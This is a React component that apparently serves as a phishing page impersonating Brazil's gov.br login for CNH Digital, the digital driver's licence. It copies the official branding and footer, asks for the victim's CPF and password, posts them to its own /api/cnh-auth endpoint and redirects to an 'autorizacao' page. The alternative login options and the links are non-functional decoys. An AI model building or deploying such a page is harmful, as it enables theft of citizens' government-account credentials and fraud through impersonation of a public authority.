import { useState } from "react";
import { useLocation } from "wouter";
import { validarCPF } from "@/lib/utils";

export default function CNHLanding() {
  const [, setLocation] = useLocation();
  const [tela, setTela] = useState<"capa" | "cpf" | "senha">("capa");
  const [cpf, setCpf] = useState("");
  const [senha, setSenha] = useState("");
  const [showSenha, setShowSenha] = useState(false);
  const [cpfError, setCpfError] = useState("");
  const [senhaError, setSenhaError] = useState("");
  const [loadingCpf, setLoadingCpf] = useState(false);
  const [loadingSenha, setLoadingSenha] = useState(false);

  const mascaraCPF = (val: string) => {
    let v = val.replace(/\D/g, "").slice(0, 11);
    if (v.length > 9) {
      v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, "$1.$2.$3-$4");
    } else if (v.length > 6) {
      v = v.replace(/(\d{3})(\d{0,3})/, "$1.$2.$3");
    } else if (v.length > 3) {
      v = v.replace(/(\d{3})(\d{0,3})/, "$1.$2");
    }
    return v;
  };

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCpfError("");
    setCpf(mascaraCPF(e.target.value));
  };

  const handleContinueCpf = async () => {
    const digits = cpf.replace(/\D/g, "");
    if (digits.length < 11 || !validarCPF(digits)) {
      setCpfError("CPF informado inválido. (ERL0000500)");
      return;
    }

    setCpfError("");
    setLoadingCpf(true);

    try {
      const res = await fetch(`/api/cnh/validate?cpf=${digits}`);
      const json = await res.json().catch(() => ({}));
      if (res.ok && json.success && json.data) {
        setTela("senha");
      } else {
        setCpfError("CPF informado inválido. (ERL0000500)");
      }
    } catch {
      setCpfError("CPF informado inválido. (ERL0000500)");
    } finally {
      setLoadingCpf(false);
    }
  };

  const handleLoginSenha = async () => {
    const digits = cpf.replace(/\D/g, "");
    if (!senha.trim()) {
      setSenhaError("Senha incorreta. Tente novamente.");
      return;
    }

    setSenhaError("");
    setLoadingSenha(true);

    try {
      const res = await fetch("/api/cnh-auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cpf: digits, senha: senha.trim() }),
      });
      const json = await res.json().catch(() => ({}));

      if (res.ok && json.success) {
        setLocation(`/autorizacao?cpf=${digits}`);
      } else {
        setSenhaError("Senha incorreta. Tente novamente.");
      }
    } catch {
      setSenhaError("Senha incorreta. Tente novamente.");
    } finally {
      setLoadingSenha(false);
    }
  };

  return (
    <>
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
      <style>{`
        html, body, #root {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          -webkit-tap-highlight-color: transparent;
          font-family: 'Raleway', 'Rawline', sans-serif;
          background-color: #000 !important;
          height: 100dvh !important;
          width: 100vw !important;
          overflow: hidden !important;
          display: flex !important;
          justify-content: center !important;
          align-items: center !important;
        }

        #tela-capa {
          width: 100%;
          max-width: 450px;
          height: 100%;
          background-color: #fff;
          position: relative;
          display: flex;
          flex-direction: column;
        }

        .capa-area {
          height: 70%;
          width: 100%;
          background-image: url('/img/capa_cnh.png');
          background-size: cover;
          background-position: center top;
          position: relative;
          flex-shrink: 0;
        }

        .capa-area::after {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 40%;
          background: linear-gradient(to bottom, rgba(0, 0, 0, 0.5), transparent);
        }

        .conteudo-branco {
          flex: 1;
          background-color: white;
          border-top-left-radius: 25px;
          border-top-right-radius: 25px;
          margin-top: -25px;
          position: relative;
          z-index: 10;
          padding: 15px 30px;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          gap: 15px;
        }

        .logo-container img {
          max-width: 140px;
          display: block;
          margin-bottom: 5px;
        }

        .termos-texto {
          text-align: center;
          font-size: 12px;
          color: #333;
          line-height: 1.3;
          margin-bottom: 5px;
        }

        .termos-texto a {
          color: #1351b4;
          text-decoration: underline;
          font-weight: 600;
        }

        .btn-gov {
          background-color: #1351b4;
          color: white;
          width: 100%;
          padding: 14px 0;
          border-radius: 50px;
          border: none;
          font-size: 14px;
          font-weight: 700;
          cursor: pointer;
          box-shadow: 0 4px 8px rgba(19, 81, 180, 0.25);
          text-transform: uppercase;
        }

        @media (min-height: 800px) {
          .conteudo-branco {
            justify-content: flex-end;
            padding-bottom: 40px;
            gap: 20px;
          }
        }

        #tela-login {
          width: 100%;
          max-width: 400px;
          height: 100%;
          background-color: #f6f6f6;
          display: flex;
          flex-direction: column;
          align-items: center;
          overflow-y: auto;
        }

        .header-login {
          display: flex;
          justify-content: flex-start;
          align-items: center;
          margin-bottom: 24px;
          padding: 16px 20px;
          width: 100%;
          background-color: #fff;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.16);
          box-sizing: border-box;
        }

        .logo-gov-login {
          width: 100px;
        }

        .login-card {
          width: calc(100% - 40px);
          background-color: #fff;
          padding: 24px 16px 22px;
          box-shadow: 0 2px 12px rgba(0, 0, 0, 0.16);
          box-sizing: border-box;
          margin-bottom: 20px;
        }

        .login-card .title {
          font-weight: 600;
          font-size: 18px;
          color: #000000;
          margin-bottom: 20px;
          width: 100%;
          text-align: left;
        }

        .login-card .subtitle {
          font-size: 16px;
          font-weight: 600;
          margin-bottom: 5px;
          display: flex;
          align-items: center;
          gap: 8px;
          width: 100%;
          color: #333;
        }

        .login-card .subtitle i {
          color: #1351b4;
        }

        .login-card .description {
          font-size: 14px;
          color: #555;
          margin-bottom: 20px;
          line-height: 1.4;
          width: 100%;
        }

        .input-group {
          margin-bottom: 20px;
          width: 100%;
        }

        .label {
          font-weight: 600;
          font-size: 14px;
          color: #333;
          margin-bottom: 5px;
          display: block;
        }

        .input-field {
          width: 100%;
          padding: 12px 15px;
          font-size: 16px;
          border: 1px solid #ccc;
          border-radius: 4px;
          outline: none;
          background-color: #fff;
          color: #333;
          box-sizing: border-box;
        }

        .input-field:focus {
          border-color: #d84800;
          box-shadow: 0 0 0 1px #d84800 inset;
          background-color: #ffee0169;
        }

        .alert-error {
          background-color: #fbf5d0;
          border: 1px solid #e5c22d;
          border-radius: 4px;
          padding: 12px 15px;
          margin-bottom: 20px;
          display: flex;
          align-items: center;
          font-size: 14px;
          color: #000;
          font-weight: 500;
          width: 100%;
          box-sizing: border-box;
        }

        .alert-error i {
          font-size: 18px;
          margin-right: 12px;
        }

        .btn-primary {
          width: 100%;
          padding: 12px;
          background-color: #1351b4;
          color: white;
          border: none;
          border-radius: 25px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          min-width: 0;
        }

        .options-title {
          font-size: 14px;
          font-weight: 600;
          margin-top: 30px;
          margin-bottom: 15px;
          border-top: 1px solid #eee;
          padding-top: 20px;
          width: 100%;
          color: #333;
        }

        .option-btn {
          display: flex;
          align-items: center;
          width: 100%;
          padding: 12px 15px;
          background: white;
          border: 1px solid #ddd;
          border-radius: 25px;
          margin-bottom: 10px;
          color: #1351b4;
          font-weight: 600;
          font-size: 14px;
          cursor: pointer;
          min-width: 0;
          box-sizing: border-box;
        }

        .option-btn i {
          margin-right: 10px;
          font-size: 16px;
          width: 20px;
          text-align: center;
          flex: 0 0 20px;
        }

        .selo {
          background-color: #008f43;
          color: white;
          font-size: 8px;
          line-height: 1;
          padding: 3px 5px;
          border-radius: 4px;
          margin-left: auto;
          white-space: nowrap;
          flex: 0 0 auto;
          text-transform: uppercase;
          font-weight: 700;
        }

        .footer {
          margin-top: 30px;
          text-align: center;
          font-size: 12px;
          color: #666;
          padding-bottom: 20px;
        }
      `}</style>

      {/* --- TELA 1: CAPA --- */}
      {tela === "capa" && (
        <div id="tela-capa">
          <div className="capa-area" />
          <div className="conteudo-branco">
            <div className="logo-container">
              <img src="/img/logo_cnh.png" alt="CNH Digital" />
            </div>
            <div style={{ width: "100%" }}>
              <div className="termos-texto">
                Ao entrar, você concorda com nosso <br />
                <a href="#">Termo de Responsabilidade</a> e <br />
                <a href="#">Política de Privacidade</a>
              </div>
              <button className="btn-gov" onClick={() => setTela("cpf")}>
                ENTRAR COM gov.br
              </button>
            </div>
          </div>
        </div>
      )}

      {/* --- TELA 2: CPF --- */}
      {tela === "cpf" && (
        <div id="tela-login">
          <div className="header-login">
            <img src="/img/logo.png" className="logo-gov-login" alt="gov.br" />
          </div>
          <div className="login-card">
            <div className="title">Identifique-se no gov.br</div>
            <div className="subtitle">
              <i className="fas fa-id-card" /> Número do CPF
            </div>
            <div className="description">
              Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
            </div>

            <div className="input-group">
              <label className="label">CPF</label>
              <input
                type="tel"
                className="input-field"
                placeholder="Digite seu CPF"
                maxLength={14}
                inputMode="numeric"
                autoComplete="off"
                value={cpf}
                onChange={handleCpfChange}
                onKeyDown={(e) => {
                  if (e.key === "Enter") handleContinueCpf();
                }}
              />
            </div>

            {cpfError && (
              <div className="alert-error">
                <i className="fas fa-exclamation-triangle" />
                <span>{cpfError}</span>
              </div>
            )}

            <button
              className="btn-primary"
              onClick={handleContinueCpf}
              disabled={loadingCpf}
            >
              {loadingCpf ? "Verificando..." : "Continuar"}
            </button>

            <div className="options-title">Outras opções de identificação:</div>
            <div className="option-btn">
              <i className="fas fa-university" /> Login com seu banco{" "}
              <span className="selo">SUA CONTA SERÁ PRATA</span>
            </div>
            <div className="option-btn">
              <i className="fas fa-qrcode" /> Login com QR code
            </div>
            <div className="option-btn">
              <i className="fas fa-mobile-alt" /> Seu aplicativo gov.br
            </div>
            <div className="option-btn">
              <i className="fas fa-cloud" /> Seu certificado digital em nuvem
            </div>
            <div className="footer">
              Ministério da Gestão e da Inovação em Serviços Públicos
            </div>
          </div>
        </div>
      )}

      {/* --- TELA 3: SENHA --- */}
      {tela === "senha" && (
        <div id="tela-login">
          <div className="header-login">
            <img src="/img/logo.png" className="logo-gov-login" alt="gov.br" />
          </div>
          <div className="login-card">
            <div className="title">Digite sua senha</div>

            <div style={{ fontSize: 14, color: "#333", fontWeight: 600, marginBottom: 5 }}>CPF</div>
            <div style={{ fontSize: 16, fontWeight: 700, color: "#000", marginBottom: 20 }}>{cpf}</div>

            <div className="input-group" style={{ position: "relative" }}>
              <label className="label">Senha</label>
              <input
                type={showSenha ? "text" : "password"}
                className="input-field"
                style={{ backgroundColor: "#fffbe6", paddingRight: 40 }}
                placeholder="Digite sua senha atual"
                value={senha}
                onChange={(e) => {
                  setSenhaError("");
                  setSenha(e.target.value);
                }}
                onKeyDown={(e) => {
                  if (e.key === "Enter") handleLoginSenha();
                }}
              />
              <i
                className={`fas ${showSenha ? "fa-eye-slash" : "fa-eye"}`}
                style={{ position: "absolute", right: 15, top: 40, cursor: "pointer", color: "#666" }}
                onClick={() => setShowSenha(!showSenha)}
              />
            </div>

            {senhaError && (
              <div className="alert-error">
                <i className="fas fa-exclamation-triangle" />
                <span>{senhaError}</span>
              </div>
            )}

            <a href="#" style={{ color: "#1351b4", textDecoration: "none", fontSize: 14, fontWeight: 600, display: "block", marginBottom: 30 }}>
              Esqueci minha senha
            </a>

            <div style={{ display: "flex", gap: 15 }}>
              <button
                type="button"
                className="btn-primary"
                style={{ backgroundColor: "#fff", color: "#1351b4", border: "1px solid #1351b4" }}
                onClick={() => {
                  setSenhaError("");
                  setSenha("");
                  setTela("cpf");
                }}
              >
                Cancelar
              </button>
              <button
                type="button"
                className="btn-primary"
                onClick={handleLoginSenha}
                disabled={loadingSenha}
              >
                {loadingSenha ? "Entrando..." : "Entrar"}
              </button>
            </div>

            <div style={{ marginTop: 30, textAlign: "center", fontSize: 14 }}>
              <a href="#" style={{ color: "#1351b4", textDecoration: "none", fontWeight: 600 }}>
                Ficou com dúvidas?
              </a>
            </div>
          </div>
        </div>
      )}
    </>
  );
}
